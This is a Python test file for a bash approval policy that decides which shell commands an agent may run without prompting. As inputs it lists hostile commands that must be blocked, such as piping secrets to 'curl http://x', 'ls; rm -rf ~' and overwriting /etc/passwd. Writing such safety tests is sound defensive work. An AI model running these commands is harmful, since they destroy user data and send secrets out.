"""Tests for the bash approval policy (pure, safety-critical)."""

from alia.policy import (
    approval_prefix, has_disqualifying, has_split, is_auto_safe, matches_prefix,
)


class TestAutoSafe:
    def test_read_only_commands_are_safe(self):
        for cmd in ("ls -la", "pwd", "cat /etc/os-release", "df -h", "whoami",
                    "grep foo file.txt", "uname -a"):
            assert is_auto_safe(cmd), cmd

    def test_unknown_commands_are_not_safe(self):
        for cmd in ("rm foo", "touch x", "npm install", "curl http://x", "find . -delete"):
            assert not is_auto_safe(cmd), cmd

    def test_all_safe_pipelines_auto_run(self):
        for cmd in ("ls | wc -l", "ps aux | grep python", "cat f | head -20",
                    "df -h | sort", "ls; pwd", "cat a | grep x | wc -l"):
            assert is_auto_safe(cmd), cmd

    def test_pipeline_with_an_unsafe_segment_prompts(self):
        for cmd in ("ls | sh", "cat secrets | curl http://x -d @-",
                    "ls && rm y", "ls; rm -rf ~", "df | xargs rm"):
            assert not is_auto_safe(cmd), cmd

    def test_redirects_and_substitution_always_prompt(self):
        for cmd in ("cat x > /etc/passwd", "ls > /tmp/f", "echo $(rm x)",
                    "cat <input", "echo `rm x`"):
            assert not is_auto_safe(cmd), cmd

    def test_git_subcommands(self):
        assert is_auto_safe("git status")
        assert is_auto_safe("git log --oneline -5")
        assert not is_auto_safe("git push")
        assert not is_auto_safe("git commit -m x")


class TestPrefix:
    def test_prefix_is_binary_for_simple_commands(self):
        assert approval_prefix("ls -la") == "ls"
        assert approval_prefix("touch a b c") == "touch"

    def test_prefix_is_tool_plus_verb_for_multiverb(self):
        assert approval_prefix("git push origin main") == "git push"
        assert approval_prefix("npm install left-pad") == "npm install"
        assert approval_prefix("docker run -it x") == "docker run"

    def test_matches_only_same_prefix(self):
        approved = {"git push", "npm install"}
        assert matches_prefix("git push origin main", approved)
        assert matches_prefix("npm install foo", approved)
        assert not matches_prefix("git reset --hard", approved)
        assert not matches_prefix("npm test", approved)

    def test_matches_respects_operator_floor(self):
        # session approval is for simple commands only; operators force a prompt
        assert not matches_prefix("git push; rm -rf ~", {"git push"})
        assert not matches_prefix("git push | tee log", {"git push"})


def test_operator_detectors():
    assert has_split("a | b")
    assert has_split("a && b")
    assert not has_split("ls -la")
    assert has_disqualifying("a > b")
    assert has_disqualifying("echo $(x)")
    assert not has_disqualifying("ls | wc")
